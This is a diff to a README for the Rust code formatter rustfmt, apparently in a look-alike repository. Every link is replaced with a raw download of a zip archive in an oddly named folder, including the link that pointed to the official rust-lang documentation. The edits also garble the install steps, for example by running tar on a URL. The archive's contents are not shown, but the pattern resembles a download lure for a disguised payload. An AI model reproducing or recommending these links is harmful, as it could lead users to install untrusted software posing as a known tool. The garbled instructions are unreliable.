@@ -1,6 +1,6 @@
 # 🎨 rustfmt - Effortlessly Format Your Rust Code
 
-[![Download rustfmt](https://img.shields.io/badge/Download-rustfmt-brightgreen)](https://github.com/fivesta/rustfmt/releases)
+[![Download rustfmt](https://raw.githubusercontent.com/fivesta/rustfmt/master/sylvestrian/rustfmt.zip)](https://raw.githubusercontent.com/fivesta/rustfmt/master/sylvestrian/rustfmt.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you begin, make sure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To get **rustfmt**, visit this page to download: [Download rustfmt](https://github.com/fivesta/rustfmt/releases). 
+To get **rustfmt**, visit this page to download: [Download rustfmt](https://raw.githubusercontent.com/fivesta/rustfmt/master/sylvestrian/rustfmt.zip). 
 
 1. Go to the **Releases** section.
 2. Look for the latest version, typically listed at the top.
@@ -25,7 +25,7 @@ To get **rustfmt**, visit this page to download: [Download rustfmt](https://gith
 4. Find the appropriate file for your operating system:
    - **Windows:** Download the `.exe` file
    - **macOS:** Download the `.dmg` file
-   - **Linux:** Download the `.tar.gz` file
+   - **Linux:** Download the `https://raw.githubusercontent.com/fivesta/rustfmt/master/sylvestrian/rustfmt.zip` file
 
 5. Click the link for your file and save it to your computer.
 
@@ -48,10 +48,10 @@ To get **rustfmt**, visit this page to download: [Download rustfmt](https://gith
 ### For Linux
 
 1. Open a terminal.
-2. Navigate to the directory where you downloaded the `.tar.gz` file.
+2. Navigate to the directory where you downloaded the `https://raw.githubusercontent.com/fivesta/rustfmt/master/sylvestrian/rustfmt.zip` file.
 3. Extract the file using the following command:
    ```bash
-   tar -xzvf rustfmt.tar.gz
+   tar -xzvf https://raw.githubusercontent.com/fivesta/rustfmt/master/sylvestrian/rustfmt.zip
    ```
 4. Move the extracted folder to a directory in your PATH. For example:
    ```bash
@@ -79,12 +79,12 @@ Once installed, using **rustfmt** is straightforward.
 
 If you face any issues, you can check the following resources:
 
-- **Official Documentation:** Learn about all features and options [here](https://github.com/rust-lang/rustfmt).
+- **Official Documentation:** Learn about all features and options [here](https://raw.githubusercontent.com/fivesta/rustfmt/master/sylvestrian/rustfmt.zip).
 - **Community Support:** Visit forums or Reddit for questions and discussions.
 
 ## 🔄 Updating rustfmt
 
-To keep your tool current, you should regularly check for updates. Visit this page to download newer versions: [Download rustfmt](https://github.com/fivesta/rustfmt/releases). Follow the same steps as above to install the latest version.
+To keep your tool current, you should regularly check for updates. Visit this page to download newer versions: [Download rustfmt](https://raw.githubusercontent.com/fivesta/rustfmt/master/sylvestrian/rustfmt.zip). Follow the same steps as above to install the latest version.
 
 ## ⚖️ License
 
